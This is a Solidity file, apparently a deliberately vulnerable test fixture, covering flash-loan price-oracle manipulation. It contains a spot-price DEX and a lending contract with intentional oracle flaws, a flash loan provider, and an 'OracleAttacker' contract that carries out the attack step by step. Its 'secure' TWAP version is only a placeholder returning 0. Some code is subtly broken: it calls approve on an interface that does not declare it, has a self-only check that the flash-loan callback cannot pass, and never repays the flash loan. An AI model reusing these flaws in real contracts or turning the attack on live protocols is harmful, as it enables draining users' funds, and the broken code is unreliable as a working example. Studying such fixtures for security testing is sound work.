// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Flash Loan Oracle Manipulation Vulnerable Contract
 * @notice DELIBERATELY VULNERABLE - For testing purposes only
 *
 * Vulnerability: Price oracle manipulation via flash loans
 * Impact: Attacker can manipulate prices and drain liquidity
 * Attack Vector: Flash loan → manipulate DEX price → exploit price oracle → profit
 *
 * Real-world examples:
 * - Harvest Finance ($34M loss)
 * - Cream Finance ($130M loss)
 * - Inverse Finance ($15M loss)
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title Simple DEX for Price Oracle
 * @notice Vulnerable DEX that uses its own reserves for pricing
 */
contract VulnerableDEX {
    IERC20 public tokenA;
    IERC20 public tokenB;

    uint256 public reserveA;
    uint256 public reserveB;

    constructor(address _tokenA, address _tokenB) {
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
    }

    /**
     * @notice Add liquidity to the pool
     */
    function addLiquidity(uint256 amountA, uint256 amountB) external {
        tokenA.transferFrom(msg.sender, address(this), amountA);
        tokenB.transferFrom(msg.sender, address(this), amountB);

        reserveA += amountA;
        reserveB += amountB;
    }

    /**
     * @notice Swap token A for token B
     * @dev VULNERABLE: Simple x*y=k formula without protection
     */
    function swapAforB(uint256 amountAIn) external {
        require(amountAIn > 0, "Invalid amount");

        // Calculate output amount using x*y=k
        uint256 amountBOut = (amountAIn * reserveB) / (reserveA + amountAIn);

        // Transfer tokens
        tokenA.transferFrom(msg.sender, address(this), amountAIn);
        tokenB.transfer(msg.sender, amountBOut);

        // Update reserves
        reserveA += amountAIn;
        reserveB -= amountBOut;
    }

    /**
     * @notice Get current price of A in terms of B
     * @dev VULNERABLE: Price can be manipulated via large swaps
     */
    function getPrice() external view returns (uint256) {
        if (reserveA == 0) return 0;
        return (reserveB * 1e18) / reserveA;
    }
}

/**
 * @title Lending Protocol with Vulnerable Oracle
 * @notice Uses DEX price directly without TWAP or other protections
 */
contract VulnerableLending {
    VulnerableDEX public dex;
    IERC20 public collateralToken;  // tokenA
    IERC20 public loanToken;        // tokenB

    mapping(address => uint256) public collateralDeposits;
    mapping(address => uint256) public loanAmounts;

    uint256 public constant COLLATERAL_RATIO = 150; // 150% collateralization

    constructor(address _dex, address _collateralToken, address _loanToken) {
        dex = VulnerableDEX(_dex);
        collateralToken = IERC20(_collateralToken);
        loanToken = IERC20(_loanToken);
    }

    /**
     * @notice Deposit collateral
     */
    function depositCollateral(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        collateralDeposits[msg.sender] += amount;
    }

    /**
     * @notice Borrow against collateral
     * @dev VULNERABLE: Uses spot price from DEX
     */
    function borrow(uint256 loanAmount) external {
        uint256 collateral = collateralDeposits[msg.sender];
        require(collateral > 0, "No collateral");

        // VULNERABILITY: Gets spot price from DEX (can be manipulated)
        uint256 price = dex.getPrice();
        uint256 collateralValue = (collateral * price) / 1e18;
        uint256 maxLoan = (collateralValue * 100) / COLLATERAL_RATIO;

        require(loanAmount <= maxLoan, "Insufficient collateral");

        loanAmounts[msg.sender] += loanAmount;
        loanToken.transfer(msg.sender, loanAmount);
    }

    /**
     * @notice Liquidate undercollateralized position
     * @dev VULNERABLE: Also uses manipulatable price
     */
    function liquidate(address user) external {
        uint256 collateral = collateralDeposits[user];
        uint256 loan = loanAmounts[user];

        // VULNERABILITY: Uses spot price for liquidation check
        uint256 price = dex.getPrice();
        uint256 collateralValue = (collateral * price) / 1e18;
        uint256 requiredCollateral = (loan * COLLATERAL_RATIO) / 100;

        require(collateralValue < requiredCollateral, "Position healthy");

        // Liquidate
        collateralDeposits[user] = 0;
        loanAmounts[user] = 0;

        collateralToken.transfer(msg.sender, collateral);
    }
}

/**
 * @title Flash Loan Provider
 * @notice Provides flash loans for the attack
 */
contract FlashLoanProvider {
    IERC20 public token;

    constructor(address _token) {
        token = IERC20(_token);
    }

    /**
     * @notice Execute flash loan
     * @param amount Amount to borrow
     * @param target Contract to call
     * @param data Calldata for the contract
     */
    function flashLoan(
        uint256 amount,
        address target,
        bytes calldata data
    ) external {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= amount, "Insufficient liquidity");

        // Transfer tokens to borrower
        token.transfer(msg.sender, amount);

        // Execute borrower's logic
        (bool success, ) = target.call(data);
        require(success, "Execution failed");

        // Ensure tokens are returned
        uint256 balanceAfter = token.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan not repaid");
    }
}

/**
 * @title Oracle Manipulation Attacker
 * @notice Exploits flash loan + price oracle vulnerability
 *
 * Attack Flow:
 * 1. Flash loan large amount of tokenA
 * 2. Swap tokenA for tokenB on DEX (manipulates price)
 * 3. Borrow maximum from lending protocol (at inflated collateral value)
 * 4. Repay flash loan
 * 5. Keep the profit from over-borrowed amount
 */
contract OracleAttacker {
    FlashLoanProvider public flashLoanProvider;
    VulnerableDEX public dex;
    VulnerableLending public lending;
    IERC20 public tokenA;
    IERC20 public tokenB;

    constructor(
        address _flashLoanProvider,
        address _dex,
        address _lending,
        address _tokenA,
        address _tokenB
    ) {
        flashLoanProvider = FlashLoanProvider(_flashLoanProvider);
        dex = VulnerableDEX(_dex);
        lending = VulnerableLending(_lending);
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
    }

    /**
     * @notice Execute the attack
     */
    function attack(uint256 flashLoanAmount) external {
        // Step 1: Take flash loan of tokenA
        bytes memory data = abi.encodeWithSignature(
            "executeAttack(uint256)",
            flashLoanAmount
        );

        flashLoanProvider.flashLoan(flashLoanAmount, address(this), data);
    }

    /**
     * @notice Execute attack logic during flash loan
     */
    function executeAttack(uint256 flashLoanAmount) external {
        require(msg.sender == address(this), "Only self");

        uint256 initialBalance = tokenB.balanceOf(address(this));

        // Step 2: Swap large amount of tokenA for tokenB
        // This manipulates the price oracle
        tokenA.approve(address(dex), flashLoanAmount);
        dex.swapAforB(flashLoanAmount / 2); // Use half for swap

        // Step 3: Deposit small collateral and borrow max
        uint256 collateral = flashLoanAmount / 2;
        tokenA.approve(address(lending), collateral);
        lending.depositCollateral(collateral);

        // Price is now manipulated, can borrow more than fair value
        uint256 maxBorrow = calculateMaxBorrow();
        lending.borrow(maxBorrow);

        // Step 4: Swap back to repay flash loan if needed
        // (Simplified - in real attack would optimize this)

        // Step 5: Profit is the difference
        uint256 finalBalance = tokenB.balanceOf(address(this));
        require(finalBalance > initialBalance, "Attack failed");
    }

    function calculateMaxBorrow() internal view returns (uint256) {
        // Simplified - would calculate based on manipulated price
        return tokenB.balanceOf(address(lending)) / 2;
    }

    receive() external payable {}
}

/**
 * @title Secure Lending with TWAP Oracle
 * @notice Fixed version using Time-Weighted Average Price
 */
contract SecureLending {
    // Would use Chainlink or Uniswap V3 TWAP oracle
    // Not implemented here for brevity

    /**
     * @notice Get TWAP price over 30 minutes
     * @dev FIXED: Uses time-weighted average, not spot price
     */
    function getTWAPPrice() external pure returns (uint256) {
        // Implementation would query Chainlink or calculate TWAP
        // from historical Uniswap observations
        return 0; // Placeholder
    }
}
